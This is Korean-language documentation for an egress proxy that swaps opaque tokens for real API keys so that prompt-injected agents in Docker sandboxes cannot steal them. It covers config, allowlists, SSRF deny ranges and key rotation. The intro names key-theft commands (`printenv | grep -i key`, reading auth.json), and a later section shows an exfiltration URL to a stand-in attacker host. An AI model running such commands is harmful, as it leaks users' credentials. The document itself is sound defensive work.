# Egress 자격 증명 주입 프록시 (iron-proxy)

Hermes가 Docker 터미널 샌드박스 안에서 에이전트를 실행하면, 해당 샌드박스에는 일반적으로 실제 업스트림 API 키(`OPENROUTER_API_KEY`, `OPENAI_API_KEY` 등)가 들어 있습니다. 프롬프트 인젝션을 받은 에이전트는 샌드박스에서 `cat ~/.config/openrouter/auth.json` 또는 `printenv | grep -i key`를 실행해 이 키를 탈취할 수 있습니다.

Egress 프록시는 이 문제를 해결합니다. 샌드박스에는 실제 키가 아닌 불투명한 **프록시 토큰**만 보관됩니다. 모든 샌드박스의 아웃바운드 트래픽은 호스트에서 실행되는 로컬 [iron-proxy](https://github.com/ironsh/iron-proxy) 데몬(Apache-2.0, Go)을 통과합니다. 데몬은 TLS를 종료하고, 요청을 업스트림으로 전달하기 전에 프록시 토큰을 실제 자격 증명으로 교체합니다. 샌드박스가 침해되더라도 공격자가 얻는 토큰은 **구성된 신뢰 프록시 경계 안에서만** 작동합니다. CA 개인 키와 프록시 엔드포인트의 무결성이 이 경계의 일부입니다. 트래픽이 공격자가 제어하는 프록시 인프라로 리디렉션될 수 있다면(예: CA 개인 키 탈취 또는 프록시 엔드포인트 하이재킹), 토큰 보장은 더 이상 유효하지 않습니다.

이번 릴리스에서는 Docker 백엔드에만 egress 프록시가 연결됩니다. Modal, Daytona, SSH, Singularity에는 아직 프록시 환경 변수나 CA 마운트가 전달되지 않습니다.

## 기능

- 호스트에서 관리되는 `iron-proxy` 하위 프로세스. 필요할 때 `~/.hermes/bin/iron-proxy`에 지연 설치됩니다.
- 샌드박스가 신뢰하는 로컬 CA `~/.hermes/proxy/ca.crt`. 이를 통해 iron-proxy가 TLS를 MITM하고 헤더를 다시 작성할 수 있습니다.
- 허용할 업스트림 호스트와 시크릿 변환 매핑을 나열하는 `~/.hermes/proxy/proxy.yaml` 설정
- 어떤 프록시 토큰이 어떤 실제 환경 변수에 대응하는지 기록하는 `mappings.json`

샌드박스에는 `HTTPS_PROXY=http://host.docker.internal:9090`, `HTTP_PROXY=http://host.docker.internal:9091`과 함께 `OPENROUTER_API_KEY` 같은 표준 제공자 환경 변수가 불투명한 프록시 토큰으로 설정됩니다. 진단을 위해 이에 대응하는 `HERMES_PROXY_TOKEN_<ENV_NAME>` 별칭도 내보냅니다. 기존 제공자 SDK는 일반적인 환경 변수 이름을 읽어 `Authorization`에 프록시 토큰을 전송하고, iron-proxy의 `secrets` 변환이 호스트 측 데몬 환경에서 가져온 실제 값으로 이를 대체합니다.

## 기능이 아닌 것

- **인바운드 `hermes proxy` 명령이 아닙니다.** 이 명령은 OAuth 애그리게이터 리버스 프록시입니다. 명령도(`hermes egress`), 방향도 다릅니다.
- **로컬 터미널과 제공자 사이에 위치하지 않습니다.** 샌드박스와 제공자 사이에만 위치합니다.
- **호스트 프로세스가 프로세스 내부에서 실행하는 LLM 호출의 자격 증명을 다시 작성하지 않습니다.** 이러한 호출은 계속 `.env` 키를 직접 사용합니다. 위협 모델의 대상은 호스트가 아니라 *샌드박스*입니다.

## 빠른 시작

```bash
# 1. Install the iron-proxy binary (pinned version, SHA-256 verified)
hermes egress install

# 2. Run the wizard: generates CA, mints proxy tokens for every provider key
#    in your env, writes proxy.yaml.
hermes egress setup

# 3. Start the proxy daemon
hermes egress start

# 4. Check status
hermes egress status
```

`hermes egress setup`은 환경 변수에서 제공자 키를 검색합니다. 키가 셸로 내보내지지 않고 `~/.hermes/.env`에만 있다면 setup이 해당 파일을 자동으로 읽으므로, 먼저 `export`할 필요가 없습니다.

나중에 `setup`을 다시 실행하면(새 허용 목록 호스트 추가, 토큰 교체, 자격 증명 소스 변경 등) 설정이 메모리에 보관되어 있기 때문에 실행 중인 데몬을 중지한 다음, **직접 재시작할지 묻습니다**. TTY에서는 질문을 표시하며, 항상 재시작하려면 `--restart`, 중지된 상태로 두려면 `--no-restart`를 전달합니다. 그 외 시점에 변경 사항을 적용하려면 `hermes egress restart`를 사용하면 중지 후 시작을 한 번에 수행합니다.

실행 중이면 Docker 터미널 백엔드는 자동으로 다음을 수행합니다.

- `~/.hermes/proxy/ca.crt`를 `/etc/ssl/certs/hermes-egress-ca.crt`로 샌드박스에 마운트합니다.
- `HTTPS_PROXY`, `HTTP_PROXY`, `REQUESTS_CA_BUNDLE`, `SSL_CERT_FILE`, `CURL_CA_BUNDLE`, `NODE_EXTRA_CA_CERTS`를 설정해 일반적인 모든 HTTP 런타임이 프록시를 통과하고 CA를 신뢰하도록 합니다.
- `NODE_OPTIONS=--use-openssl-ca`를 기존 `docker_env.NODE_OPTIONS`에 추가해 설정된 다른 CA 번들이 제어하는 OpenSSL 저장소를 Node.js가 사용하도록 합니다. 남아 있는 차이점은 아래 [Node.js 비대칭 CA 주의 사항](#nodejs-asymmetric-ca-caveat)을 참조하세요.
- `--add-host=host.docker.internal:host-gateway`를 추가해 Linux에서 샌드박스가 호스트 측 프록시에 접근할 수 있도록 합니다(macOS/Windows의 Docker Desktop에서는 이를 자동으로 처리합니다).
- 표준 제공자 환경 변수(예: `OPENROUTER_API_KEY`)와 발급된 각 매핑마다 하나씩 생성되는 `HERMES_PROXY_TOKEN_<ENV_NAME>` 진단 별칭에 프록시 토큰을 내보냅니다.

## 설정

전체 설정은 `~/.hermes/config.yaml`의 `proxy:` 섹션에 있습니다. 기본값은 설정 안에 문서화되어 있으며, 모든 항목은 선택 사항입니다.

```yaml
proxy:
  # Master switch. When false the feature is a complete no-op — no
  # binaries downloaded, no docker mounts added, no subprocess started.
  enabled: false

  # Tunnel listener port. Sandboxes hit http://host.docker.internal:<port>.
  tunnel_port: 9090

  # Auto-download the pinned iron-proxy binary on first use.
  auto_install: true

  # Where iron-proxy looks up the real upstream secrets at egress time.
  #   env       — process env (default). Whatever is in your ~/.hermes/.env
  #               at proxy-start time is the source of truth.
  #   bitwarden — refetch from Bitwarden Secrets Manager on each proxy
  #               restart. Rotation in the BW web app propagates without
  #               touching .env. Requires `secrets.bitwarden.enabled: true`.
  credential_source: env

  # When true (default), the Docker backend refuses to start a sandbox if
  # the proxy is enabled but not running. Set to false to fall back to the
  # legacy "real credentials inside the sandbox" posture when the proxy
  # is unavailable.
  enforce_on_docker: true

  # When `credential_source: bitwarden` but the BWS access token /
  # project_id is missing OR the bws fetch returns no values for mapped
  # providers, the daemon raises by default (matches the spirit of "I
  # asked for rotation — don't silently use stale env values").  Set
  # to true to opt back into the legacy host-env fallback — useful for
  # migrations where you want to start switching to BW mode but haven't
  # wired every secret yet.
  allow_env_fallback: false

  # SSRF deny list applied to outbound traffic.  Omit / leave null to
  # use the safe default: loopback (v4 + v6), link-local (incl. cloud
  # metadata IPs at 169.254.169.254), RFC1918, IPv6 ULA, IPv4-mapped-v6,
  # CGNAT, and the RFC2544 benchmark range.  Set to an explicit `[]`
  # to opt out entirely (only sensible in hermetic tests).
  upstream_deny_cidrs: null

  # Extra allowed upstream hosts beyond the bundled defaults.
  # Wildcards (`*.foo.com`) are supported. The defaults cover OpenRouter,
  # OpenAI, Anthropic, Google, xAI, Mistral, Groq, Together, DeepSeek,
  # and Nous Research.
  extra_allowed_hosts: []
```

### 기본 허용 업스트림 호스트

```
openrouter.ai           *.openrouter.ai
api.openai.com          api.anthropic.com
generativelanguage.googleapis.com
api.x.ai                api.mistral.ai
api.groq.com            api.together.xyz
api.deepseek.com        inference.nousresearch.com
```

에이전트가 목록에 없는 업스트림(자체 호스팅 추론 엔드포인트, 추가 클라우드 LLM, MCP 서버 등)을 사용해야 한다면 `proxy.extra_allowed_hosts`에 추가하세요. 와일드카드는 전체 호스트 이름에 대해 매칭됩니다(`*.example.com`은 `api.example.com` 및 `staging.example.com`과 일치하지만 `example.com` 자체와는 일치하지 않습니다).

### 기본 SSRF 차단 CIDR

허용 목록과 관계없이 적용됩니다. 이 범위는 네트워크 경계에서 iron-proxy가 거부하므로, 허용 목록에 있는 호스트를 통한 DNS rebinding 공격도 IMDS나 내부 네트워크에 접근할 수 없습니다.

| CIDR | 용도 |
|---|---|
| `127.0.0.0/8`, `::1/128` | 루프백 (v4 + v6) |
| `169.254.0.0/16`, `fe80::/10` | 링크 로컬 — **`169.254.169.254`의 AWS / GCP / Azure IMDS 포함** |
| `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` | RFC1918 |
| `fc00::/7` | IPv6 ULA |
| `::ffff:0:0/96` | IPv4 매핑 IPv6 — 이중 스택 IMDS 우회 차단 |
| `100.64.0.0/10` | RFC6598 CGNAT (AWS VPC, K8s 파드 네트워크에서 사용) |
| `198.18.0.0/15` | RFC2544 벤치마크 범위 |

재정의하려면 `proxy.upstream_deny_cidrs`를 직접 지정한 목록으로 설정하세요. 완전히 비활성화하려면(예: 루프백 업스트림에 접근해야 하는 hermetic 테스트) 빈 목록 `[]`으로 설정합니다.

### 바인드 정책

프록시는 절대 `0.0.0.0`에 바인드하지 않습니다. iron-proxy v0.39은 데몬 프로세스당 **단일 바인드만 지원**하므로 기본 바인드는 플랫폼별로 다릅니다.

- **Linux:** Docker 브리지 게이트웨이(기본값 `172.17.0.1:<tunnel_port>`). 컨테이너는 `host.docker.internal`을 통해 프록시에 접근하며, `--add-host=host.docker.internal:host-gateway`가 이를 정확히 이 브리지 게이트웨이 IP로 확인합니다. 루프백 전용 바인드는 샌드박스 내부에서 접근할 수 없으므로 사용할 수 없습니다. 브리지 IP는 호스트의 `docker0` 인터페이스에 있는 주소이므로 LAN에 노출되지 않지만, 기본 브리지 네트워크의 다른 컨테이너에서는 접근할 수 있습니다. 다만 요청에는 발급된 프록시 토큰과 허용 목록에 있는 업스트림이 여전히 필요합니다. Docker 브리지가 감지되지 않으면(Docker가 설치되지 않았거나 실행 중이 아닌 경우) 경고와 함께 루프백으로 대체됩니다.
- **macOS / Windows Docker Desktop:** 루프백(`127.0.0.1:<tunnel_port>`). Desktop의 VPNkit이 `host.docker.internal`을 호스트로 라우팅하므로 루프백은 컨테이너에서 접근할 수 있으며, 노출이 가장 적은 선택입니다.

유출된 프록시 토큰을 가진 LAN 피어도 프록시를 사용할 수 없습니다. 두 바인드 모두 외부 네트워크에서는 접근할 수 없기 때문입니다.

또한 `metrics.listen: 127.0.0.1:0`을 고정해 데몬의 내장 메트릭 서버가 기본 `:9090` 대신 임시 루프백 포트를 사용하도록 합니다. 그렇지 않으면 `tunnel_port: 9090`과 같은 소켓을 두고 경쟁하여 데몬이 "address already in use"와 함께 시작을 거부합니다. `:0` 임시 포트는 시작할 때마다 무작위로 정해지고 어디에도 표시되지 않으므로, 이 고정 설정에서는 메트릭이 사실상 비활성화됩니다.

PATH 앞쪽에 있는 악성 `ip` 셸이 브리지 주소로 비공개가 아닌 IPv4(`0.0.0.0`, 공인 주소, 멀티캐스트, 링크 로컬 등)를 주입했더라도 루프백 대체가 적용됩니다. `ipaddress.IPv4Address`와 `is_*` 검사를 통해 검증할 수 없는 주소에는 절대 바인드하지 않습니다.

## 지원되는 인증 방식

`secrets` 변환은 매칭된 위치에 나타나는 모든 곳에서 프록시 토큰을 교체하며, `Authorization: Bearer`보다 다양한 방식을 지원합니다.

| 제공자 | 환경 변수 | 교체 위치 |
|---|---|---|
| OpenRouter, OpenAI, Groq, Together, DeepSeek, Mistral, xAI, Nous | `*_API_KEY` | `Authorization` 헤더 |
| Anthropic native | `ANTHROPIC_API_KEY` | `x-api-key` + `Authorization` |
| Azure OpenAI | `AZURE_OPENAI_API_KEY` | `api-key` + `Authorization` (`*.openai.azure.com`, `*.cognitiveservices.azure.com`, `*.services.ai.azure.com`) |
| Google AI Studio (Gemini) | `GEMINI_API_KEY` / `GOOGLE_API_KEY` | `x-goog-api-key` 헤더 또는 `?key=` 쿼리 매개변수 |

`GEMINI_API_KEY`와 `GOOGLE_API_KEY`는 하나의 자격 증명으로 취급됩니다. 단일 프록시 토큰이 발급되어 샌드박스의 **두** 이름에 모두 주입되며, 호스트 환경에 있는 어느 이름이든 검색을 충족합니다.

## 지원되지 않는 제공자

요청 서명이나 SDK에서 발급하는 OAuth를 사용하는 인증 방식은 정적인 헤더 교체로 처리할 수 없습니다. 해당 환경 변수가 있으면 샌드박스에는 그 제공자의 **실제 자격 증명**이 보관되므로, 해당 제공자에 대해서는 egress 격리 보장이 완전하지 않습니다.

| 환경 변수 | 제공자 | 이유 |
|---|---|---|
| `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` | AWS Bedrock / SageMaker | SigV4 서명 요청 |
| `GOOGLE_APPLICATION_CREDENTIALS` | GCP Vertex AI | 서비스 계정 파일에서 발급되는 OAuth |

이 환경 변수는 관련 없는 도구(terraform, gcloud, aws CLI, ECR push)를 위해 대부분의 개발자 노트북에 존재합니다. 마법사와 `hermes egress status`에서는 경고로 표시되지만 프록시 시작을 막지는 않습니다. 샌드박스에서 해당 제공자를 사용하지 않는다면 변수를 `unset`해 경고를 지울 수 있습니다.

## Bitwarden 통합

이미 [`hermes secrets bitwarden setup`](../secrets/bitwarden)을 통해 Bitwarden Secrets Manager를 사용하고 있다면, egress 프록시는 `os.environ` 대신 여기에서 실제 자격 증명을 가져올 수 있습니다.

```bash
hermes egress setup --from-bitwarden
```

이 명령은 `proxy.credential_source: bitwarden`을 설정하고 BW 프로젝트에서 제공자 환경 변수 이름을 검색합니다.
### 키 회전

`credential_source: bitwarden`인 경우 iron-proxy 데몬은 시작할 때마다 **`bws secret list <project_id>`**를 통해 BWS에서 시크릿을 다시 가져옵니다. 따라서 회전 흐름은 다음과 같습니다.

1. Bitwarden 웹 앱에서 키를 회전합니다.
2. 호스트에서 `hermes egress stop && hermes egress start`를 실행합니다.
3. 그 이후 시작된 샌드박스는 프록시 토큰을 새 값으로 교체합니다.

`.env`를 수정할 필요가 없습니다. 호스트에서 Hermes를 재시작할 필요도 없습니다. 새 값을 다루는 것은 프록시 데몬뿐이며, 호스트 프로세스와 `os.environ`은 변경되지 않습니다.

### 시작 시 즉시 실패

`credential_source: bitwarden`인 경우 `hermes egress start`는 위저드 계층에서 사전 검사하고, `_build_proxy_subprocess_env`는 데몬 계층에서 다시 검사합니다.

- BWS 액세스 토큰 환경 변수가 설정되지 않음 → `unset`한 뒤 다시 실행하거나 `hermes egress setup --no-bitwarden`을 실행해 env 모드로 되돌리라는 안내와 함께 시작을 거부합니다.
- `secrets.bitwarden.project_id`가 비어 있음 → `hermes secrets bitwarden setup`을 실행하라는 안내와 함께 시작을 거부합니다.
- `bws secret list`가 매핑된 프로바이더 중 하나 이상에 대해 값을 반환하지 않음 → 누락된 이름을 나열하며 시작을 거부합니다.

이는 의도된 동작입니다. BW 모드에서 호스트 환경 변수로 폴백하면 BW 경로가 해결하려는 바로 그 오래된 값 문제를 다시 도입하게 됩니다(운영자는 회전 보장을 위해 BW를 선택했으며, 자동 폴백은 그 보장을 깨뜨립니다).

`proxy.allow_env_fallback: true` 설정 플래그를 사용하면 마이그레이션 시나리오에서 기존의 "BWS에 연결할 수 없을 때 호스트 env로 조용히 폴백" 동작을 다시 활성화할 수 있습니다. 시크릿을 한 번에 하나씩 BW로 옮기는 중이고, 사용 가능한 값으로 데몬을 시작하려는 경우 사용하세요.

### credential source 전환

| 현재 값 | 변경할 값 | 명령 |
|---|---|---|
| env | bitwarden | `hermes egress setup --from-bitwarden` |
| bitwarden | env | `hermes egress setup --no-bitwarden` |

두 플래그 중 어느 것도 사용하지 않고 `hermes egress setup`을 **다시 실행하면 기존 `credential_source`가 유지됩니다** — 위저드는 env로 조용히 다운그레이드하지 않습니다. 이는 bitwarden 모드를 구성한 뒤에는 회전 보장이 선택의 핵심이 되기 때문입니다. 변경하려면 명시적으로 "다시 env를 사용하겠다"고 지정해야 합니다.

## 슬래시 명령

CLI 하위 명령 트리:

```
hermes egress install                  # download the pinned iron-proxy binary
hermes egress install --force          # re-download even if a managed copy exists

hermes egress setup                    # interactive wizard
hermes egress setup --tunnel-port N    # override the tunnel listener port
hermes egress setup --from-bitwarden   # use BWS as credential source (fail-loud)
hermes egress setup --no-bitwarden     # explicitly switch back to env mode
hermes egress setup --rotate-tokens    # mint fresh tokens for every provider
                                       #   (default preserves existing)

hermes egress start                    # spawn the managed proxy daemon
hermes egress stop                     # SIGTERM (then SIGKILL after 5s grace)
hermes egress restart                  # stop (if running) then start — needed when
                                       #   upstream SECRETS change (rotation, new provider)
hermes egress reload                   # hot-reload the ruleset from proxy.yaml via the
                                       #   management API — no restart, no dropped
                                       #   connections (allowlist / mapping edits)

hermes egress status                   # binary + config + pid + listening state + mappings
hermes egress status --show-tokens     # print proxy tokens in full
                                       #   (default: redacted prefix + suffix only)

hermes egress disable                  # flip proxy.enabled = false
                                       #   (does not stop a running proxy)

hermes egress config                   # print the path to proxy.yaml for debugging
```

### 토큰 회전

기본적으로 `hermes egress setup`은 이미 토큰이 있는 프로바이더의 프록시 토큰을 **유지**합니다. 새 프로바이더를 추가하면 새 프로바이더에 대해서만 새 토큰을 발급하고, 기존 토큰은 변경하지 않습니다. 따라서 위저드를 다시 실행해도 실행 중인 샌드박스에서 401 오류가 발생하지 않습니다.

`--rotate-tokens`는 모든 토큰을 회전합니다.

```bash
hermes egress setup --rotate-tokens
```

기존 토큰이 있고 stdin이 tty인 경우 위저드는 확인을 요청합니다.

```
⚠  --rotate-tokens will invalidate proxy tokens in every running
   Hermes sandbox.  They will start 401-ing against upstreams until restarted.
Type 'rotate' to confirm:
```

비-tty 호출(CI, 스크립트)에서는 프롬프트를 건너뜁니다 — 이 플래그는 의도적인 동작으로 처리됩니다. 덮어쓰기 전에 현재 `mappings.json`을 타임스탬프가 붙은 형제 파일로 복사하므로 수동 복구가 가능합니다.

```
backup: ~/.hermes/proxy/mappings.json.rotated-20260524T143012
```

`hermes egress setup`은 설정 또는 토큰 매핑을 다시 쓸 때 실행 중인 데몬을 중지합니다. 데몬이 이전 YAML을 메모리에 유지하기 때문입니다. `--rotate-tokens` 실행 후:

```bash
hermes egress start
```

이미 실행 중인 컨테이너는 이전 토큰을 유지하므로 새 토큰을 적용하려면 재시작해야 합니다. 새 영구 Docker 컨테이너에는 egress 상태 레이블이 포함되므로 Hermes는 새 세션에 사용할 컨테이너로 egress 적용 전 또는 회전 전 컨테이너를 재사용하지 않습니다.

## 상태 디렉터리 구조

iron-proxy가 관리하는 모든 항목은 `~/.hermes/proxy/`에 있습니다.

| 경로 | 모드 | 용도 |
|---|---|---|
| `~/.hermes/proxy/` (dir) | `0o700` | 사용자만 소유하고 탐색 가능 |
| `ca.crt` | `0o644` | 샌드박스에 배포되는 공개 CA 인증서 |
| `ca.key` | `0o600` | CA 서명 키 — 호스트 밖으로 나가지 않음 |
| `proxy.yaml` | `0o600` | iron-proxy 설정; 모든 `setup` 실행 시 다시 작성 |
| `mappings.json` | `0o600` | 샌드박스 프록시 토큰 → 업스트림 환경 변수 |
| `mappings.json.rotated-*` | `0o600` | `--rotate-tokens`가 생성하는 백업 |
| `iron-proxy.pid` | `0o600` | 실행 중인 데몬의 PID |
| `iron-proxy.nonce` | `0o600` | PID 재활용 방지를 위한 시작별 nonce |
| `iron-proxy.log` | `0o600` | 데몬 stdout/stderr — **v0.39에서는 요청별 레코드 포함** |
| `audit.log` | `0o600` | 향후 바이너리 버전에서 전용 요청별 감사 스트림을 위해 예약됨; 업스트림이 연결할 때 개인정보 보호 계약이 유지되도록 미리 생성 |

CA 개인 키는 가장 민감한 파일입니다. 첫 바이트부터 `0o600`으로 생성되어(umask-window TOCTOU 없음) `O_NOFOLLOW`가 적용되므로 동일 UID 공격자가 심어 둔 심볼릭 링크로 리디렉션할 수 없습니다. pidfile, nonce 파일, 데몬 로그 및 감사 로그에도 동일한 처리가 적용됩니다.

### iron-proxy v0.39의 로깅

현재 고정된 바이너리 버전(**v0.39.0**)에서 iron-proxy는 데몬 수준 진단 정보와 요청별 레코드를 포함한 **모든 출력**을 **`~/.hermes/proxy/iron-proxy.log`**에 기록합니다. v0.39의 `config.Log` 구조체에는 별도의 `audit_path` 필드가 없으므로, 여기서는 요청별 레코드를 전용 스트림으로 보낼 수 없습니다.

그래도 `O_NOFOLLOW`를 적용해 `~/.hermes/proxy/audit.log`를 `0o600`으로 미리 생성하는 이유는 다음과 같습니다.

1. 향후 버전 변경을 위한 경로를 예약합니다. 고정 버전이 `log.audit_path`를 지원하는 버전으로 올라가면 운영자 측 재구성 없이 요청별 레코드가 그곳으로 흐르기 시작합니다. **그때까지 파일은 0바이트로 유지되므로 모니터링, 알림 또는 포렌식 도구의 대상으로 지정하지 마세요.** 현재는 모든 용도에 `iron-proxy.log`를 사용하세요.
2. `0o600`을 첫 바이트부터 보장하여, 파일이 아직 존재하지 않을 때 v0.40 이상이 기본 umask로 파일을 생성할 수 있는 업스트림 수정일에 대비합니다.

해당 버전 변경이 적용될 때까지는 다음 두 대상 모두에 대해 `iron-proxy.log`를 기준 정보로 취급하세요.

- 데몬 수준 이벤트(시작 배너, bind 오류, 종료 이유, 변환 오류). 운영 및 문제 해결용.
- 요청별 레코드(allowlist에 포함된 업스트림으로의 CONNECT, 시크릿 교체 발생, allowlist 거부). 포렌식 및 규정 준수용.

두 파일 모두 재시작 후에도 계속 추가 기록됩니다. 장기 실행 호스트의 디스크 사용량이 걱정된다면 logrotate로 회전하세요.

## 작동 방식

```
┌──────────────┐                ┌──────────────┐                ┌─────────────┐
│ Docker       │ CONNECT /     │ iron-proxy    │ HTTPS w/       │ OpenRouter  │
│ sandbox      ├──────────────▶│ (host:9090)   ├───────────────▶│ / OpenAI /  │
│              │ HTTP forward  │               │ real API key   │ Anthropic …  │
│ has:         │ w/ proxy tok  │ mints leaf    │                │             │
│ - proxy tok  │ in Auth hdr   │ cert from CA  │                │             │
│ - CA cert    │               │ matches token │                │             │
│ - HTTPS_PROXY│               │ swaps secret  │                │             │
└──────────────┘               └──────────────┘                └─────────────┘
                                       │
                                       │ daemon + per-request log (combined on v0.39)
                                       ▼
                              ~/.hermes/proxy/iron-proxy.log
                              (~/.hermes/proxy/audit.log reserved for v0.40+ split stream)
```

1. 샌드박스가 `Authorization: Bearer hermes-proxy-openrouter-…`(실제 키가 아닌 프록시 토큰)을 포함한 `POST https://openrouter.ai/v1/chat/completions` 같은 HTTPS 요청을 보냅니다.
2. `HTTPS_PROXY`가 설정되어 있으므로 요청은 CONNECT 터널로 iron-proxy에 전달됩니다.
3. iron-proxy가 allowlist를 확인합니다. `openrouter.ai`는 허용됩니다.
4. iron-proxy가 CA로 서명한 `openrouter.ai`용 leaf 인증서를 발급하고 TLS 연결을 종료한 다음 요청을 검사합니다.
5. `secrets` transform이 `Authorization` 헤더에서 프록시 토큰 문자열과 일치하는 값을 찾아 iron-proxy 자체 환경 변수에서 가져온 실제 `OPENROUTER_API_KEY` 값으로 대체합니다.
6. 요청이 다시 암호화되어 OpenRouter로 전달됩니다.
7. v0.39에서는 요청이 `~/.hermes/proxy/iron-proxy.log`에 기록됩니다. 고정된 바이너리 버전이 분리 스트림(v0.40 이상)을 지원하게 되면 요청별 레코드는 `~/.hermes/proxy/audit.log`로 흐르고 데몬 수준 진단 정보는 `iron-proxy.log`에 남습니다. [iron-proxy v0.39의 로깅](#logging-on-iron-proxy-v039)을 참조하세요.

allowlist에 없는 호스트(예: `https://attacker.example.com/leak?key=...`)에 대한 요청은 호스트 밖으로 바이트가 하나도 나가기 전에 HTTP 403으로 거부됩니다. 거부 사실은 업스트림 호스트와 원본 샌드박스가 함께 `iron-proxy.log`에 기록됩니다.

### 샌드박스로의 CA 배포

Docker 백엔드가 `proxy.enabled: true`인 컨테이너를 시작하고 데몬이 리스닝 중이면 다음 인수를 `docker run`에 추가합니다.

| 인수 | 용도 |
|---|---|
| `-v ~/.hermes/proxy/ca.crt:/etc/ssl/certs/hermes-egress-ca.crt:ro` | CA를 읽기 전용으로 마운트 |
| `-e HTTPS_PROXY=http://host.docker.internal:9090` | Python httpx / curl / go 기본 transport / Node fetch |
| `-e HTTP_PROXY=http://host.docker.internal:9091` | 일반 HTTP용 curl + wget — 일반 HTTP 포워드 리스너는 `tunnel_port + 1`에서 실행 |
| `-e NO_PROXY=127.0.0.1,localhost,::1` | 샌드박스 내부의 루프백 개발 서버는 프록시 우회 |
| `-e REQUESTS_CA_BUNDLE=…ca.crt` | Python `requests` |
| `-e SSL_CERT_FILE=…ca.crt` | Python `ssl` 모듈 / OpenSSL — 시스템 저장소를 **대체** |
| `-e CURL_CA_BUNDLE=…ca.crt` | curl — 시스템 저장소를 **대체** |
| `-e NODE_EXTRA_CA_CERTS=…ca.crt` | Node.js — 시스템 저장소에 **추가** |
| `-e NODE_OPTIONS="<your value> --use-openssl-ca"` | Node.js — OpenSSL 저장소를 사용하도록 라우팅(추가됨; 사용자의 `--max-old-space-size` 등은 유지) |
| `-e HERMES_EGRESS_PROXY=1` | 에이전트가 프록시 인식 상태인지 확인할 수 있는 센티널 |
| `-e OPENROUTER_API_KEY=<proxy-token>` | 기존 SDK가 계속 작동하도록 표준 프로바이더 환경 변수에 프록시 토큰을 전달 |
| `-e HERMES_PROXY_TOKEN_<NAME>=…` | 각 매핑의 진단용 별칭; 표준 프로바이더 환경 변수와 동일한 값 |
| `--add-host=host.docker.internal:host-gateway` | Linux 전용; Docker Desktop에서는 자동으로 매핑 |
#### Node.js 비대칭 CA 주의사항

`REQUESTS_CA_BUNDLE` / `SSL_CERT_FILE` / `CURL_CA_BUNDLE`은 샌드박스 내부에서 시스템 CA 저장소를 **대체**합니다. `NODE_EXTRA_CA_CERTS`는 시스템 CA 저장소에 인증서를 **추가**합니다. 이론적으로 샌드박스 내부의 Node.js 프로세스는 원시 `net.Socket`을 열고 자체 TLS 핸드셰이크를 시작하여 프록시를 우회할 수 있습니다. 시스템 CA 저장소는 여전히 실제 업스트림 인증서를 신뢰하므로, Python / curl이 검증에 실패하는 경우에도 요청이 성공합니다.

`NODE_OPTIONS=--use-openssl-ca`는 `docker_env.NODE_OPTIONS`에 이미 있는 값 뒤에 추가됩니다. 이를 통해 Node가 `SSL_CERT_FILE`이 제어하는 OpenSSL 저장소를 사용하도록 강제하여 이러한 비대칭을 줄입니다. `tls.connect()` 또는 `https.request()`에 자체 `ca` 옵션을 명시적으로 전달하는 코드는 대상으로 하지 않지만, 쉬운 우회 경로는 차단합니다.

이는 알려진 v1 제한입니다. 업스트림 해결 방법은 [github.com/ironsh/iron-proxy/issues](https://github.com/ironsh/iron-proxy/issues)에서 추적하세요. 그동안 이그레스 격리에 의존하는 샌드박스에서 원시 소켓을 여는 신뢰할 수 없는 Node 코드를 실행하지 마세요.

### `docker_env` 충돌

`docker_env:` 설정 블록에 프록시를 제어하는 환경 변수를 설정하면(드물지만 가능합니다) `enforce_on_docker: true`일 때 Hermes가 샌드박스 시작을 거부합니다. 여기에는 다음이 모두 포함됩니다.

- 이그레스 제어 변수: `HTTPS_PROXY`, `HTTP_PROXY`, `NO_PROXY`, `REQUESTS_CA_BUNDLE`, `SSL_CERT_FILE`, `CURL_CA_BUNDLE`, `NODE_EXTRA_CA_CERTS`
- 실제 provider 환경 변수: `mappings.json`에 있는 모든 이름(예: `OPENROUTER_API_KEY`, `OPENAI_API_KEY`)

오류 예시는 다음과 같습니다.

```
docker_env in config.yaml overrides egress-proxy variables
['HTTPS_PROXY', 'OPENROUTER_API_KEY']; enforce_on_docker is enabled.
Remove these keys from docker_env or disable enforce_on_docker to
opt out of egress isolation.
```

`enforce_on_docker: false`이면 동일한 상황이 경고로 표시되고 `docker_env` 값이 우선합니다. 마이그레이션이나 테스트에는 유용하지만, 이그레스 격리 보장에서 명시적으로 옵트아웃하는 것입니다.

## PID 및 nonce 방어

데몬의 pidfile은 `O_EXCL` + `O_NOFOLLOW` + 소유권 확인을 사용해 작성됩니다. 동시에 실행된 `hermes egress start` 호출은 다음 두 결과 중 하나가 됩니다.

- 기존 pidfile이 실행 중인 iron-proxy를 가리키면 두 번째 start가 "another start in progress"라는 메시지와 `hermes egress stop`을 실행하라는 힌트를 표시하며 거부됩니다.
- 기존 pidfile이 오래된 것(데몬이 충돌한 경우)이면 두 번째 start가 이를 unlink하고 한 번 재시도합니다.

그 외에도 모든 `start_proxy`는 두 곳에 새로운 무작위 nonce를 심습니다.

- 데몬의 환경 변수에 `HERMES_IRON_PROXY_NONCE=<nonce>`
- `~/.hermes/proxy/iron-proxy.nonce` (pidfile과 나란히 있으며 권한은 `0o600`)

`hermes egress stop`(또는 다른 `_pid_alive` 확인)이 어떤 PID가 iron-proxy 충돌 후 동일한 PID를 할당받은 무관한 프로세스가 아니라 *우리* 데몬을 가리키는지 확인하려 할 때는 `/proc/<pid>/environ`을 읽고 nonce를 찾습니다. 디스크에 저장된 사본이 CLI 호출 간에도 이 작업을 가능하게 합니다(`_proxy_nonce`는 프로세스별 메모리 값이라 `hermes`를 호출할 때마다 초기화됩니다).

nonce 확인에 실패하면 코드는 `argv[0]`의 basename을 `iron-proxy`와 비교하는 방식으로 대체합니다. `stop_proxy`는 SIGTERM 전에 `/proc/<pid>/stat`의 starttime도 기록하고 5초의 유예 시간이 지난 뒤 다시 확인합니다. starttime이 달라졌다면 대기 중 PID가 재사용된 것이므로 SIGKILL을 억제하고 경고를 표시합니다.

## 보안 모델

**보호되는 항목:**

- Docker 샌드박스 안에서 프롬프트 인젝션을 받은 에이전트가 `printenv` / credential 파일을 읽고 실제 키를 유출하는 행위.
- 샌드박스 안의 손상된 의존성이 임의의 호스트로 접속하는 행위 — 기본 거부 allowlist가 알 수 없는 대상 주소를 차단합니다.
- 에이전트가 클라우드 메타데이터 엔드포인트(`169.254.169.254`)에 접속하는 행위 — iron-proxy는 IPv4 매핑 IPv6 형식인 `::ffff:169.254.169.254`를 포함하여 `upstream_deny_cidrs`를 통해 기본적으로 이를 거부합니다.
